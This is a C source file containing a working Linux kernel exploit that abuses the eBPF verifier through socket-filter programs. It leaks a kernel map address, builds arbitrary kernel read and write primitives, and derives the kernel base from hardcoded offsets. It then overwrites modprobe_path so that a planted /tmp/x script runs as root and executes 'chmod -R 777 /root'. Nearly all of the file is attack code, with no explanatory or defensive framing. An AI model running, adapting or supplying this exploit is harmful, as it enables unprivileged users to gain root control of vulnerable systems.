#include <linux/bpf.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include "bpf_insn.h"

#define ofs_array_map_ops 0xc12dc0
#define ofs_modprobe_path 0xe38340

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int bpf(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int map_create(int val_size, int max_entries) {
  union bpf_attr attr = {
    .map_type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(int),
    .value_size = val_size,
    .max_entries = max_entries
  };
  int mapfd = bpf(BPF_MAP_CREATE, &attr);
  if (mapfd == -1) fatal("bpf(BPF_MAP_CREATE)");
  return mapfd;
}

int map_update(int mapfd, int key, void *pval) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key = (uint64_t)&key,
    .value = (uint64_t)pval,
    .flags = BPF_ANY
  };
  int res = bpf(BPF_MAP_UPDATE_ELEM, &attr);
  if (res == -1) fatal("bpf(BPF_MAP_UPDATE_ELEM)");
  return res;
}

int map_lookup(int mapfd, int key, void *pval) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key = (uint64_t)&key,
    .value = (uint64_t)pval,
    .flags = BPF_ANY
  };
  return bpf(BPF_MAP_LOOKUP_ELEM, &attr); // -1 if not found
}

unsigned long addrof_map(int mapfd) {
  unsigned long val;
  char verifier_log[0x10000];

  /* Exploit */
  struct bpf_insn insns[] = {
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),

    // Get map pointer to leak
    // map_lookup_elem(mapfd, key=0)
    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0), // key=0
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),
    
    // R0 = 0xffffffffffffffff
    BPF_MOV64_IMM(BPF_REG_0, 0xffffffff),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_0, 32),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0xffffffff),

    // R0 --> actual=1 / speculated=0
    BPF_MOV64_IMM(BPF_REG_1, 64),
    BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_0, 1),

    // R0 --> actual=9 / speculated=8
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 8),

    // Fill stack with pointer to leak
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x18),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x20),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x28),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x30),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x38),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x40),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x48),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x50),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x58),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x60),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x68),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x70),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x78),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x80),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x88),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x90),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x98),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xa0),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xa8),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xb0),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xb8),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xc0),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xc8),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xd0),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xd8),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xe0),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xe8),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xf0),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0xf8),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x100),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x108),
    // [FP-0x08] = FP
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_FP, -0x08),

    // skb_load_bytes(skb, offset=0, to=FP-0x10, len=R0)
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),
    BPF_MOV64_IMM(BPF_REG_ARG2, 0),
    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_0),
    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),

    // [FP-0x08] is partially overwritten stack pointer
    // [[FP-0x08]-0x10] is likely a map pointer but speculated as scalar
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, -0x08),
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, -0x10),

    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_0, -0x10),
    // map_update_elem(mapfd, key=0, val=R0, )
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
    BPF_MOV64_IMM(BPF_REG_ARG4, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_update_elem),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };

  union bpf_attr prog_attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = sizeof(insns) / sizeof(insns[0]),
    .insns = (uint64_t)insns,
    .license = (uint64_t)"GPL v2",
    .log_level = 2,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };

  int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
  if (progfd == -1) fatal("bpf(BPF_PROG_LOAD)");

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    fatal("socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    fatal("setsockopt");

  /* partially overwrite stack pointer
     |        |     |        |
     +--------+     +--------+
     | uninit | --> |AAAAAAAA|
     +--------+     +--------+
     |   FP   |     |\0 FP   |
     +--------+     +--------+
   */
  write(socks[1], "\x41\x41\x41\x41\x41\x41\x41\x41\x00", 9);

  map_lookup(mapfd, 0, &val);
  return val;
}

unsigned long aar64(int mapfd, unsigned long addr) {
  unsigned long val;
  char verifier_log[0x10000];

  /* Exploit */
  struct bpf_insn insns[] = {
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),

    // map_lookup_elem(mapfd, key=0)
    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0), // key=0
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

    // R0 = 0xffffffffffffffff
    BPF_MOV64_IMM(BPF_REG_0, 0xffffffff),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_0, 32),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0xffffffff),

    // R0 --> actual=1 / speculated=0
    BPF_MOV64_IMM(BPF_REG_1, 64),
    BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_0, 1),

    // R0 --> actual=0x10 / speculated=0x08
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 8),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 8),

    // [FP-0x08] = &map[0]
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x08),

    // skb_load_bytes(skb, offset=0, to=FP-0x10, len=R0)
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),
    BPF_MOV64_IMM(BPF_REG_ARG2, 0),
    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_0),
    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),

    // [FP-0x08] is overwritten fake pointer
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, -0x08),
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0), // AAR

    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0),
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_0, -0x10),
    // map_update_elem(mapfd, key=0, val=R0, )
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
    BPF_MOV64_IMM(BPF_REG_ARG4, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_update_elem),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };

  union bpf_attr prog_attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = sizeof(insns) / sizeof(insns[0]),
    .insns = (uint64_t)insns,
    .license = (uint64_t)"GPL v2",
    .log_level = 2,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };

  int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
  if (progfd == -1) fatal("bpf(BPF_PROG_LOAD)");

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    fatal("socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    fatal("setsockopt");

  /* overwrite stack pointer
     |        |     |        |
     +--------+     +--------+
     | uninit | --> |AAAAAAAA|
     +--------+     +--------+
     | &map[0]|     |fake ptr|
     +--------+     +--------+
   */
  unsigned long payload[2];
  payload[0] = 0xdeadbeefcafebabe;
  payload[1] = addr;
  write(socks[1], (void*)payload, 0x10);

  map_lookup(mapfd, 0, &val);
  return val;
}


unsigned long aaw64(int mapfd, unsigned long addr, unsigned long value) {
  unsigned long val;
  char verifier_log[0x10000];

  /* Exploit */
  struct bpf_insn insns[] = {
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),

    // map_lookup_elem(mapfd, key=0)
    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0), // key=0
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

    // R0 = 0xffffffffffffffff
    BPF_MOV64_IMM(BPF_REG_0, 0xffffffff),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_0, 32),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0xffffffff),

    // R0 --> actual=1 / speculated=0
    BPF_MOV64_IMM(BPF_REG_1, 64),
    BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_0, 1),

    // R0 --> actual=0x10 / speculated=0x08
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 8),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 8),

    // [FP-0x08] = &map[0]
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x08),

    // skb_load_bytes(skb, offset=0, to=FP-0x10, len=R0)
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),
    BPF_MOV64_IMM(BPF_REG_ARG2, 0),
    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_0),
    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),

    // [FP-0x08] is overwritten fake pointer
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, -0x08),
    BPF_MOV64_IMM(BPF_REG_1, value >> 32),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, value & 0xffffffff),
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0), // AAW

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };

  union bpf_attr prog_attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = sizeof(insns) / sizeof(insns[0]),
    .insns = (uint64_t)insns,
    .license = (uint64_t)"GPL v2",
    .log_level = 2,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };

  int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
  if (progfd == -1) fatal("bpf(BPF_PROG_LOAD)");

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    fatal("socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    fatal("setsockopt");

  /* overwrite stack pointer
     |        |     |        |
     +--------+     +--------+
     | uninit | --> |AAAAAAAA|
     +--------+     +--------+
     | &map[0]|     |fake ptr|
     +--------+     +--------+
   */
  unsigned long payload[2];
  payload[0] = 0xdeadbeefcafebabe;
  payload[1] = addr;
  write(socks[1], (void*)payload, 0x10);
}

int main() {
  int mapfd, hoge;

  mapfd = map_create(8, 16);
  unsigned long addr_map = addrof_map(mapfd);
  printf("[+] &map = 0x%016lx\n", addr_map);

  unsigned long addr_ops = aar64(mapfd, addr_map - 0x110);
  printf("[+] &ops = 0x%016lx\n", addr_ops);
  unsigned long kbase = addr_ops - ofs_array_map_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);
  unsigned long addr_modprobe = kbase + ofs_modprobe_path;
  printf("[+] modprobe_path = 0x%016lx\n", addr_modprobe);

  aaw64(mapfd, addr_modprobe, 0x782f706d742f); // "/tmp/x"

  system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/x");
  system("chmod +x /tmp/x");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn");

  return 0;
}
